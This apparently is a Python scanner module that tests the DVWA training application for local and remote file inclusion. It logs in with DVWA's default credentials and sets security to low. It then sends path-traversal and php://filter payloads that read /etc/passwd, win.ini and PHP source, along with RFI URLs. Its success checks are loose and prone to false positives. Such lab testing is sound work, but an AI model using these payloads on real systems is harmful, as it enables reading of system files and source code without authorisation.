"""
File Inclusion Scanner Module (LFI/RFI)
"""
from urllib.parse import urljoin
from bs4 import BeautifulSoup
from src.utils.logger import setup_logger

class FileInclusionScanner:
    def __init__(self, session, target_url, verbose=False):
        self.session = session
        self.target_url = target_url
        self.verbose = verbose
        self.logger = setup_logger(verbose)
        self.vulnerabilities_found = []

    def dvwa_login(self):
        """Login to DVWA (reuse from other scanners)"""
        try:
            self.logger.info("🔐 Attempting to login to DVWA...")
            login_url = urljoin(self.target_url, "/login.php")
            get_response = self.session.get(login_url)
            if get_response.status_code != 200:
                self.logger.error(f"❌ Failed to access login page. Status: {get_response.status_code}")
                return False
            soup = BeautifulSoup(get_response.text, 'html.parser')
            csrf_token_input = soup.find('input', {'name': 'user_token'})
            if not csrf_token_input:
                self.logger.error("❌ Could not find CSRF token on login page")
                return False
            csrf_token = csrf_token_input.get('value')
            self.logger.debug(f"📋 Found CSRF token: {csrf_token}")
            login_data = {
                "username": "admin",
                "password": "password",
                "Login": "Login",
                "user_token": csrf_token
            }
            post_response = self.session.post(login_url, data=login_data)
            if "Login failed" in post_response.text:
                self.logger.error("❌ Login failed - Incorrect username/password")
                return False
            elif "PHPSESSID" in self.session.cookies:
                self.logger.info("✅ Successfully logged into DVWA")
                self.set_dvwa_security_low()
                return True
            else:
                self.logger.error("❌ Login failed - Unknown reason")
                return False
        except Exception as e:
            self.logger.error(f"💥 Login error: {str(e)}")
            return False

    def set_dvwa_security_low(self):
        """Set DVWA security to low"""
        try:
            security_url = urljoin(self.target_url, "/security.php")
            response = self.session.get(security_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            csrf_token_input = soup.find('input', {'name': 'user_token'})
            if not csrf_token_input:
                self.logger.warning("⚠️ Could not find CSRF token on security page")
                return
            csrf_token = csrf_token_input.get('value')
            security_data = {
                "security": "low",
                "seclev_submit": "Submit",
                "user_token": csrf_token
            }
            response = self.session.post(security_url, data=security_data)
            if "Security level is currently: low" in response.text:
                self.logger.info("✅ DVWA security level set to LOW")
            else:
                self.logger.warning("⚠️ Could not verify security level change")
        except Exception as e:
            self.logger.warning(f"⚠️ Could not set security level: {str(e)}")

    def test_dvwa_file_inclusion_page(self):
        """Test DVWA's File Inclusion page for LFI/RFI"""
        self.logger.info("🎯 Testing DVWA File Inclusion page...")
        self.vulnerabilities_found = []

        if not self.dvwa_login():
            self.logger.error("🚫 Cannot proceed without DVWA login")
            return False

        fi_url = urljoin(self.target_url, "/vulnerabilities/fi/")
        vulnerabilities_found = 0

        # LFI payloads (Local File Inclusion)
        lfi_payloads = [
            "../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\win.ini",
            "../../../../etc/hosts",
            "php://filter/convert.base64-encode/resource=../../../../etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "file:///etc/passwd",
        ]

        # RFI payloads (Remote File Inclusion) – for testing we can use a local file via HTTP wrapper
        # In DVWA low security, RFI is enabled, but we'll test with a simple external check.
        rfi_payloads = [
            "http://localhost:8081/?",
            "http://127.0.0.1:8081/",
            "https://www.google.com/",  # Would be blocked likely
        ]

        # Combined list for testing
        test_payloads = lfi_payloads + rfi_payloads

        for payload in test_payloads:
            try:
                self.logger.debug(f"🧪 Testing payload: {payload}")
                params = {"page": payload}
                response = self.session.get(fi_url, params=params)

                if self.is_file_inclusion_successful(response.text, payload):
                    self.logger.warning(f"📁 FILE INCLUSION VULNERABILITY FOUND!")
                    self.logger.warning(f"   Payload: {payload}")
                    self.logger.warning(f"   URL: {fi_url}")
                    self.vulnerabilities_found.append({
                        "payload": payload,
                        "url": fi_url,
                        "type": "File Inclusion"
                    })
                    vulnerabilities_found += 1

            except Exception as e:
                self.logger.error(f"❌ Error testing payload {payload}: {str(e)}")

        if vulnerabilities_found > 0:
            self.logger.warning(f"🎯 Found {vulnerabilities_found} File Inclusion vulnerabilities!")
            return True
        else:
            self.logger.info("✅ No File Inclusion vulnerabilities detected")
            return False

    def is_file_inclusion_successful(self, response_text, payload):
        """Detect if file inclusion succeeded based on response content."""
        # Indicators of successful LFI
        lfi_indicators = [
            "root:",          # /etc/passwd entry
            "daemon:",
            "bin:",
            "sys:",
            "[extensions]",   # win.ini
            "for 16-bit app support",
            "localhost",      # /etc/hosts
            "::1",            # /etc/hosts
            "<?php",          # PHP source code (via php filter)
            "base64",         # base64 encoded output
        ]

        # Indicators of RFI attempt (e.g., inclusion of external content)
        # For RFI, if the page includes an external script, it might execute and output something.
        # But in DVWA, RFI may show "include()" errors or actually include content.
        rfi_indicators = [
            "http://",        # If the included URL appears in response? Not reliable.
            "failed to open stream",  # PHP error when include fails
            "Unable to include",      # Custom error
        ]

        for indicator in lfi_indicators:
            if indicator.lower() in response_text.lower():
                self.logger.debug(f"   Found LFI indicator: {indicator}")
                return True

        # For RFI, we can look for signs that the remote inclusion was attempted/executed.
        # In DVWA, if RFI is enabled, it might fetch and output the remote file.
        # We'll check if the response contains "Warning: include("http"..." or the remote content.
        # For simplicity, if we see a remote URL in the response or an error about inclusion, flag it.
        if "include(" in response_text.lower() and ("http:" in response_text.lower() or "https:" in response_text.lower()):
            self.logger.debug("   Found RFI attempt indicator")
            return True

        return False